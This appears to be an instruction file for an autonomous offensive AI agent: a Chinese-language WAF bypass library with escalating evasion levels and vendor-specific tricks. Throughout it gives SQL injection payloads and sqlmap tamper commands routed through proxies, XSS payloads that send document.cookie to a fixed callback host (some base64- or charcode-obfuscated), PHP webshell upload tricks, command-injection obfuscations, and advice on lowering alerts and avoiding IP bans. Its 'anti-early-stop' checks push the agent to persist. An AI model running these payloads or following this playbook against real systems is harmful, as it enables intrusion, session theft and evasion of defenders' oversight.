---
name: waf-bypass-arsenal
description: Comprehensive WAF bypass technique library covering encoding, protocol-level, and vendor-specific evasion for all attack classes
version: 1.0.0
---

# WAF 绕过技术总库

## 适用场景

所有攻击类 skill 在 WAF 识别阶段确认目标存在 WAF 后,必须引用本 skill 选择对应绕过组合。本 skill 是纯方法论库,不独立执行攻击,而是为 sqli-deep-exploitation、xss-weaponization、file-upload-webshell、rce-post-exploitation 等提供绕过 payload 模板和策略矩阵。

## 前置 skill

waf-detection-and-fingerprinting (必须先完成 WAF 识别才能选择绕过策略)

## 绕过升级路径 (七级,连续 3 次同级失败强制升级)

- **Level 1**: 基础编码 (URL 单层)
- **Level 2**: 编码组合 (URL + Unicode + 大小写)
- **Level 3**: 关键字拆分 + 注释插入
- **Level 4**: 协议层 (Content-Type / Verb / Chunked / HPP)
- **Level 5**: sqlmap tamper 多脚本串联
- **Level 6**: 源站绕过 (DNS history / 历史 IP / SSL 反查)
- **Level 7**: 协议差异 (HTTP/2 / Smuggling)

## 一、通用绕过技术

### 1.1 编码栈

```
# URL 一次编码
' → %27    < → %3c    > → %3e    " → %22    ( → %28    ) → %29

# URL 二次编码
%27 → %2527    %3c → %253c    %22 → %2522

# URL 三次编码
%2527 → %252527

# Unicode 编码
< → %u003c    > → %u003e    ' → %u0027    " → %u0022

# HTML entity (十进制)
< → &#60;    > → &#62;    ' → &#39;    " → &#34;

# HTML entity (十六进制)
< → &#x3c;    > → &#x3e;    ' → &#x27;

# 全角字符替换
< → ＜    > → ＞    " → ＂    ' → ＇    ( → （    ) → ）

# 混合编码 (URL + Unicode + HTML entity 叠加)
<script> → %3c%u0073%63ript%3e
UNION SELECT → %55%4e%49%4f%4e%20%u0053ELECT
```

### 1.2 大小写混淆

```
SELECT → sElEcT / SeLeCt / SELect / selECT
UNION → uNiOn / UnIoN / UNion
SCRIPT → sCrIpT / ScRiPt / SCRipt
ONERROR → oNeRrOr / OnErRoR
ALERT → aLeRt / AlErT
```

### 1.3 注释拆分

```sql
SE/**/LECT → SE/*randomtext*/LECT
UN/*!*/ION → UN/*!50000ION*/
SEL%0aECT
SELECT/*comment*/1
UN/**/ION/**/SE/**/LECT
/*!50000UNION*//*!50000SELECT*/
```

### 1.4 空白替换

```
空格 → /**/
空格 → /+/
空格 → %20 / %09 / %0a / %0b / %0c / %0d / %a0
空格 → 反引号 `
空格 → 括号 ()
空格 → %00 (null byte)
```

### 1.5 参数污染 HPP

```
?id=1&id=2
?id[]=1&id[]=2
?id=1%00&id=2
```

### 1.6 HTTP Verb Tampering

```bash
# 原始 GET 被拦,切 POST
curl -sk -X POST https://TARGET/vuln -d "id=1' UNION SELECT 1,2,3--"

# 切 PUT
curl -sk -X PUT https://TARGET/vuln -d "id=1' UNION SELECT 1,2,3--"

# 自定义 Verb
curl -sk -X CATS https://TARGET/vuln?id=1'+UNION+SELECT+1,2,3--
```

### 1.7 HTTP Header 注入

```bash
curl -sk https://TARGET/ -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -H "X-Host: localhost"
```

### 1.8 Content-Type 切换

```bash
# 原始 form → json
curl -sk https://TARGET/api -H "Content-Type: application/json" -d '{"id":"1 UNION SELECT 1,2,3--"}'

# form → multipart
curl -sk https://TARGET/api -F "id=1' UNION SELECT 1,2,3--"

# form → xml
curl -sk https://TARGET/api -H "Content-Type: application/xml" -d '<root><id>1 UNION SELECT 1,2,3--</id></root>'

# form → text/plain
curl -sk https://TARGET/api -H "Content-Type: text/plain" -d "id=1' UNION SELECT 1,2,3--"
```

### 1.9 分块传输 Chunked

```bash
curl -sk https://TARGET/vuln -H "Transfer-Encoding: chunked" -d $'7\r\nid=1' U\r\n9\r\nNION SEL\r\n8\r\nECT 1,2\r\n4\r\n,3--\r\n0\r\n\r\n'
```

### 1.10 大 body / 超长参数填充

```bash
python3 -c "print('id=1' + 'A'*8000 + \"' UNION SELECT 1,2,3--\")" | curl -sk https://TARGET/vuln -d @-
```

## 二、SQLi 专用绕过

### 2.1 关键字拆分

```sql
UN/**/ION SE/**/LECT 1,2,3--
U%6eION SEL%65CT 1,2,3--
unIoN%0aSeLeCt 1,2,3--
/*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3--
%55nion %53elect 1,2,3--
```

### 2.2 函数替换

```sql
-- substring 替换
substring(user(),1,1) → mid(user(),1,1)
substring(user(),1,1) → left(user(),1)
substring(user(),1,1) → right(left(user(),1),1)
substr(user(),1,1)

-- concat 替换
concat(user(),0x3a,version()) → concat_ws(0x3a,user(),version())
concat(user(),0x3a,version()) → group_concat(user(),0x3a,version())

-- database() 替换
database() → schema()
```

### 2.3 引号绕过

```sql
-- 十六进制
'admin' → 0x61646d696e
-- CHAR 函数
'admin' → CHAR(97,100,109,105,110)
-- 反引号
SELECT `user` FROM `users`
-- 双写
'' → 空 (绕过转义)
-- 无引号注入 (数值型)
id=1 UNION SELECT 1,2,3
```

### 2.4 等号绕过

```sql
-- LIKE
admin' AND 1=1-- → admin' AND 1 LIKE 1--
-- REGEXP
AND username='admin' → AND username REGEXP 0x61646d696e
-- IN
AND 1=1 → AND 1 IN(1)
-- BETWEEN
AND 1=1 → AND 1 BETWEEN 1 AND 1
-- 异或
AND 1=1 → AND 1^0
```

### 2.5 WAF 关键字黑名单绕过 (双写)

```sql
union → ununionion
select → sselectelect
and → aandnd / &&
or → oorr / ||
where → whwhereere
```

### 2.6 时间盲注 sleep 替换

```sql
-- MySQL
SLEEP(5) → BENCHMARK(10000000,SHA1('a'))
SLEEP(5) → GET_LOCK('a',5)

-- PostgreSQL
pg_sleep(5)

-- MSSQL
WAITFOR DELAY '0:0:5'

-- Oracle
DBMS_PIPE.RECEIVE_MESSAGE('a',5)
DBMS_LOCK.SLEEP(5)
```

### 2.7 编码组合三层叠加

```
原始: ' UNION SELECT user(),version(),database()--
L1 URL: %27%20UNION%20SELECT%20user(),version(),database()--
L2 URL+大小写+注释: %27%20uNiOn/**/SeLeCt%20user(),version(),database()--
L3 URL+Unicode+注释+空白: %27%09un%u0069on/**/se%u006cect%09user()%2cversion()%2cdatabase()--%0a
```

### 2.8 sqlmap tamper 组合 (按 WAF 厂商)

```bash
# 安全狗 (Safedog) — 直连版
sqlmap -u "URL" --tamper=space2comment,between,randomcase,nonrecursivereplacement --random-agent --delay 2

# 安全狗 — 代理版
sqlmap -u "URL" --tamper=space2comment,between,randomcase,nonrecursivereplacement --random-agent --delay 2 --proxy="socks5://<PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000"

# 阿里云盾 (Yundun) — 直连版
sqlmap -u "URL" --tamper=charencode,equaltolike,greatest,between,space2mssqlhash --random-agent --delay 3 --threads 1

# 阿里云盾 — 代理版
sqlmap -u "URL" --tamper=charencode,equaltolike,greatest,between,space2mssqlhash --random-agent --delay 3 --threads 1 --proxy="http://<PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:1000"

# 长亭雷池 (SafeLine) — 直连版
sqlmap -u "URL" --tamper=charunicodeencode,space2comment,between,equaltolike --random-agent --delay 5 --threads 1

# 长亭雷池 — 代理版
sqlmap -u "URL" --tamper=charunicodeencode,space2comment,between,equaltolike --random-agent --delay 5 --threads 1 --proxy="socks5://<PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000"

# ModSecurity OWASP CRS — 直连版
sqlmap -u "URL" --tamper=modsecurityversioned,modsecurityzeroversioned,space2comment,charencode --random-agent --delay 2

# ModSecurity — 代理版
sqlmap -u "URL" --tamper=modsecurityversioned,modsecurityzeroversioned,space2comment,charencode --random-agent --delay 2 --proxy="socks5://<PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000"

# Cloudflare — 直连版
sqlmap -u "URL" --tamper=space2randomblank,between,randomcase,charunicodeencode --random-agent --delay 5 --threads 1

# Cloudflare — 代理版
sqlmap -u "URL" --tamper=space2randomblank,between,randomcase,charunicodeencode --random-agent --delay 5 --threads 1 --proxy="socks5://<PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000"

# 宝塔 WAF — 直连版
sqlmap -u "URL" --tamper=space2comment,randomcase --random-agent --delay 1

# 360/玄武/D盾 — 直连版 (慢速)
sqlmap -u "URL" --tamper=space2comment,between,randomcase,charencode,nonrecursivereplacement --random-agent --delay 5 --threads 1

# AWS WAF — 直连版
sqlmap -u "URL" --tamper=space2randomblank,charunicodeencode,between --random-agent --delay 3 --chunked
```

## 三、XSS 专用绕过

### 3.1 标签替换

```html
<script> 被拦 → <svg/onload=...>
<svg> 被拦 → <img src=x onerror=...>
<img> 被拦 → <body onload=...>
<body> 被拦 → <details open ontoggle=...>
<details> 被拦 → <video><source onerror=...>
<video> 被拦 → <audio src=x onerror=...>
<audio> 被拦 → <math><mtext><table><mglyph><svg><mtext><textarea><path d="M0" onmouseover=...>
<marquee> 被拦 → <iframe srcdoc="&lt;script&gt;...&lt;/script&gt;">
```

### 3.2 事件替换

```html
onerror 被拦 → onload / onfocus / onmouseover / onanimationstart / onpointerrawupdate / onbeforetoggle / ontransitionend / onresize / onauxclick
```

### 3.3 协议替换

```
javascript: → java%0ascript: / java%09script: / java&Tab;script: / java%0dscript:
data: → data:text/html;base64,PHNjcmlwdCBzcmM9Ly88WFNTX0NBTExCQUNLX0hPU1Q+LzE+PC9zY3JpcHQ+
```

### 3.4 编码绕过

```html
<!-- HTML entity 十进制 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- HTML entity 十六进制 -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Unicode \u -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

<!-- String.fromCharCode -->
<img src=x onerror=eval(String.fromCharCode(102,101,116,99,104,40,39,47,47,60,88,83,83,95,67,65,76,76,66,65,67,75,95,72,79,83,84,62,47,49,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))>

<!-- eval(atob()) -->
<svg/onload=eval(atob('ZmV0Y2goJy8vPFhTU19DQUxMQkFDS19IT1NUPi8xP2M9Jytkb2N1bWVudC5jb29raWUp'))>
```

### 3.5 CSP 绕过

```html
<!-- JSONP 回调 -->
<script src="https://allowed-cdn.com/jsonp?callback=fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)//"></script>

<!-- nonce 重用 (如果发现 CSP nonce 固定) -->
<script nonce="LEAKED_NONCE">fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)</script>

<!-- base-uri 缺失 -->
<base href="//<XSS_CALLBACK_HOST>/"><script src="/1"></script>

<!-- data: 协议 (unsafe-inline 启用时) -->
<script src="data:text/javascript,fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)"></script>
```

### 3.6 DOM clobbering / mXSS

```html
<!-- DOM clobbering -->
<form id=x><input name=y value="fetch('//<XSS_CALLBACK_HOST>/1')">
<a id=x><a id=x name=y href="//<XSS_CALLBACK_HOST>/1">

<!-- mutation XSS -->
<svg><![CDATA[><img src=x onerror=fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)>]]></svg>
<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)>
```

### 3.7 回连地址 (固定)

所有 XSS payload 回连地址一律为 `//<XSS_CALLBACK_HOST>/1`,不允许替换。

## 四、文件上传绕过

### 4.1 扩展名绕过

```
双扩展: shell.php.jpg / shell.php5 / shell.phtml / shell.pht / shell.phps
大小写: shell.PhP / shell.PHP / shell.pHp
空字节: shell.php%00.jpg / shell.php\x00.jpg
特殊字符: shell.php::$DATA (Windows) / shell.php. / shell.php  (trailing space)
长文件名: aaaa...(240+chars)...a.php (截断)
```

### 4.2 MIME / 魔术字节

```
MIME 伪造: Content-Type: image/jpeg (实际是 PHP)
GIF 头注入: GIF89a<?php system($_GET['cmd']);?>
PNG 头注入: \x89PNG\r\n\x1a\n<?php system($_GET['cmd']);?>
```

### 4.3 解析漏洞

```
Apache: shell.php.xxx (未知扩展从右向左解析)
Nginx: /uploads/shell.jpg/.php (PATH_INFO 漏洞)
IIS 6: shell.asp;.jpg / shell.asa / shell.cer / shell.cdx
IIS 7.5: /uploads/shell.jpg/x.php
```

### 4.4 配置文件劫持

```
.htaccess: AddType application/x-httpd-php .jpg
.user.ini: auto_prepend_file=shell.jpg
web.config: <handlers><add name="x" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="...php-cgi.exe" /></handlers>
```

## 五、RCE / 命令注入绕过

### 5.1 字符过滤绕过

```bash
$(whoami) / `whoami`
${IFS} 替代空格: cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat<>/etc/passwd
sh<<<'whoami'
```

### 5.2 关键字混淆

```bash
ca''t /etc/passwd
c\at /etc/passwd
"ca""t" /etc/passwd
$'\143\141\164' /etc/passwd
```

### 5.3 编码执行

```bash
echo d2hvYW1p | base64 -d | sh
echo 77686f616d69 | xxd -r -p | sh
printf '\x77\x68\x6f\x61\x6d\x69' | sh
```

### 5.4 通配符

```bash
/???/??t /etc/passwd → /bin/cat /etc/passwd
/b?n/c?t /e?c/p?sswd
/b[i]n/c[a]t /e[t]c/p[a]sswd
```

## 六、各品牌 WAF 专用绕过速查

### Cloudflare
- 优先走源站 IP (DNS history / SSL cert / Censys / 邮件头 / favicon hash)
- 载荷偏好: chunked + HPP + `space2randomblank`
- XSS 用 atob 编码 / data: base64 / iframe srcdoc
- 速率: ≤30 req/min

### ModSecurity OWASP CRS
- 偏好 `modsecurityversioned` + `modsecurityzeroversioned` + 反引号 + 注释拆分
- `/*!50000UNION*/` 内联注释绕过规则版本号判断
- 超长参数填充推过检测缓冲区

### 安全狗 (Safedog)
- `/*x*/union/*x*/` + `%0a` 换行 + 内联注释 + chunked
- 大小写 + 双写关键字
- Content-Type 切换有效率高

### 阿里云盾 (Yundun)
- 减少 union 关键字 / 用 `like` 替 `=` / `xor` 替 `and`
- 多用十六进制和 `char()`
- 控制单包大小 <2KB
- 国内出口 + 国内 UA 有效降低告警

### 长亭雷池 (SafeLine)
- 语义分析引擎,常规注释/大小写效果差
- 需用变形语句 + 编码组合 + 无关键字注入 (如纯数字/十六进制)
- 避免出现明显 SQL 语法特征

### 宝塔 WAF (BT-WAF)
- 关键字黑名单为主,绕过相对宽松
- 大小写 + 注释拆分一般即可绕过
- chunked 编码效果好

### 360 / 玄武 / D 盾
- 关键字 + 频率双重检测
- 慢速攻击 (`--delay 5 --threads 1`) + payload 变形组合
- 双写关键字 + 编码叠加

### AWS WAF
- 超大 body 填充 (>8KB 推过缓冲区) + 分块传输
- Header 注入 `X-Forwarded-For` 伪装内网
- HPP 参数污染

## WAF 对抗集成

本 skill 不独立发起攻击,由其他攻击类 skill 按 WAF 指纹卡片引用对应绕过组合。

## 代理池启用判定

当 WAF 绕过升级到 Level 4+ 时建议启用代理池降低 IP 封禁风险:
- SOCKS5: `<PROXY_HOST>:2000` 账号 `<PROXY_USERNAME>` 密码 `<PROXY_PASSWORD>`
- HTTP: `<PROXY_HOST>:1000` 同账号密码

## 敏感数据采集点

本 skill 无直接数据采集,为其他 skill 提供绕过能力。

## 失败处理

1. 同 Level 连续 3 次失败 → 强制升级到下一 Level
2. Level 7 仍失败 → 标记 WAF_HARDENED,切攻击面或目标
3. 代理被封 → 重试 1 次,仍失败切回直连
4. 编码导致 payload 语义损坏 → 回退一级重试
5. 多种绕过组合穷尽 → 转换攻击类别 (如 SQLi 转 SSRF / 逻辑漏洞)

## 报告必填字段

- 使用的绕过 Level
- 具体绕过技术组合
- 成功率统计 (尝试次数 / 成功次数)
- WAF 厂商 + 版本

## 反早停检查

1. 是否遍历了至少 3 个 Level 的绕过技术?
2. 是否针对识别到的 WAF 厂商使用了专用绕过组合?
3. 是否在失败时正确升级了 Level 而非在同 Level 反复尝试?
